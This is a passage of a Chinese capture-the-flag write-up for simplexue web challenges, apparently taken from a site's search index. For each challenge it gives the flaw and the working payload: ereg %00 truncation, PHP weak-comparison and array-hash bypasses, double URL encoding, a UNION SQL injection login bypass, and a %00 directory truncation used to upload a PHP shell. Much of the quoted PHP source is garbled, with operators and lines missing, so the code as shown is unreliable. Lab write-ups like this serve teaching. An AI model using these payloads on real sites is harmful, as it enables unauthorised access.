转存表中的数据 `user` -- INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES (1, '****不可见***', '***不可见***', 0); */ ........这一行是省略的代码........ if(!empty($token)&&!empty($emailAddress)){ if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = \"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'\"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r>0){ echo $flag; }else{ echo \"失败了呀\"; } } payload: token=0e11111111&emailAddress=admin@simplexue.com 0x12 Once More 简单概括： 考点：ereg函数%00截断，科学计数法 难度：易 WP：1e9%00*-* 解题过程： 打开题目，得到题目源码： You password must be alphanumeric'; } else if (strlen($_GET['password']) 9999999) { if (strpos ($_GET['password'], '*-*') !== FALSE) { die('Flag: ' . $flag); } else { echo('*-* have not been found'); } } else { echo 'Invalid password'; } } ?> 首先判断是否用过get方式传入password，其次判断是否只含有数字和字母，如果是则返回错误，接着判断长度小于8且大于9999999。看到这里估计就知道是要考科学计数法了，最后要求get的数据包含*-*。我们知道1E8就等于10000000，这样就可以满足长度小于8且大于9999999的条件，不过我们先得绕开判断只有数字和字母的条件，我们知道ereg函数可利用%00进行截断攻击，故我们的payload构造如下：?password=1e8%00*-*注意此处的%00只占一个字符的大小。 0x13 Guess Next Session 简单概括： 考点：Session与Cookie绑定，PHP弱类型比较 难度：易 WP：删掉Cookie，?password= 解题过程： 打开题目得到源码： Wrong guess.'; } mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000)); ?> 创建session，通过get方式取password值再与session里的password值进行比较，这里我们不知道 session里的password值是多少的，而且我们并不能控制session，不过这里的比较是用==弱类型比较，猜想，如果我们将cookie删除，那么$_SESSION['password']的值将为NULL，此时如果我们get传入的 password为空，即''，那么比较结果即为true。payload:将cookie删除或禁用，接着访问?password= 0x14 FALSE 简单概括： 考点：sha1,md5等传入数组返回Null，PHP弱类型比较 难度：易 WP：?name[]=1&password[]=2 解题过程： 打开题目获得源码： Your password can not be your name!'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo 'Invalid password.'; } else{ echo 'Login first!'; ?> 我们知道sha1()函数与md5()类似，当参数为数组时会返回NULL，如果我们传入的name与password为数组时无论其为什么值，都可以通过sha1($name)===sha1($password)的强类型判断。故我们的payload构造如下：?name[]=a&password[]=b 0x15 上传绕过 简单概括： 考点：目录名%00截断 难度：易 WP：/upload/1.php%00 解题过程： burp抓个上传包：首先尝试了文件名%00阶段，发现无用，然后看到了我们可以控制上传的目录名，猜测后台为获取目录名再与文件名拼接。如果我们的目录名存在截断漏洞，那么我们可以构造/uploads/1.php%00这样拼接的时候就只有目录名，达到getshell的目的。 0x16 NSCTF web200 简单概括： 考点：逆加密过程 难度：易 WP：部分： x = \"~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg\" c = \"\" for a in x: b = ord(a) c += chr(b-1) print(c) 解题过程： 打开题目：解密问题，按照加密过程反着解密即可。 0x17 程序逻辑问题 简单概括： 考点：union select联合注入 难度：易 WP：user=123aaa%27+union+select+%27c4ca4238a0b923820dcc509a6f75849b&pass=1 解题过程： 打开题目，右键查看源代码得到题目源码： welcome to simplexue connect_error) { die(\"Connection failed: \" . mysql_error($conn)); } $user = $_POST[user]; $pass = md5($_POST[pass]); $sql = \"select pw from php where user='$user'\"; $query = mysql_query($sql); if (!$query) { printf(\"Error: %s\\n\", mysql_error($conn)); exit(); } $row = mysql_fetch_array($query, MYSQL_ASSOC); //echo $row[\"pw\"]; if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) { echo \"Logged in! Key:************** \"; } else { echo(\"Log in failure!\"); } } ?> strcasecmp()函数不分大小写进行字符串比较。首先我们不知道数据库里已有的用户值为多少，更不知其密码。不过我们可以通过构造联合查询注入来返回我们自定义的数据。payloadd: user=abc' union select 'c4ca4238a0b923820dcc509a6f75849b&pass=11的md5为：c4ca4238a0b923820dcc509a6f75849b 0x18 what a fuck!这是什么鬼东西? 简单概括： 考点：JSFUCK 难度：易 WP：复制代码到浏览器控制台执行即可 解题过程： 复制粘贴进浏览器的js控制台，回车运行即可。 0x19 PHP大法 简单概括： 考点：PHP自动解码机制 难度：易 WP：id=%2568ackerDJ 解题过程： 打开题目，页面提示：index.php.txt，打开得到源码： not allowed!\"); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == \"hackerDJ\") { echo \"Access granted!\"; echo \"flag: *****************} \"; } ?> Can you authenticate to this website? $_GET[id]在取到值后已经自动urldecode了一次，然而后边再用urldecode解码一次，故可以使用二次编码绕过前边的关键字检测。 0x1A 这个看起来有点简单! 简单概括： 考点：Union无过滤注入 难度：易 WP：无 0x1B 貌似有点难 简单概括： 考点：Header头IP伪造 难度：易 WP：无 0x1C 头有点大 简单概括： 考点：UA头伪造 难度：易 WP：无 0x1D 猫抓老鼠 简单概括： 考点：脑洞 难度：及其变态神经病的题目 WP：无 解题过程： 查看访问请求返回头，发现有东西：将这串base64放到表单里提交即可。 0x1E 看起来有点难 简单概括： 考点：时间盲注 难度：中 WP：sqlmap一把嗦 "},"thankyou.html":{"url":"thankyou.html","title":"小小地捐助本站","keywords":"","body":"捐助本站 感谢各位师傅的捐助 alert(\"支持下这破站吧。\") "},"reply.html":{"url":"reply.html","title":"有问题?请在这里反馈!","keywords":"","body":"请在这里留下你的宝贵建议 "}}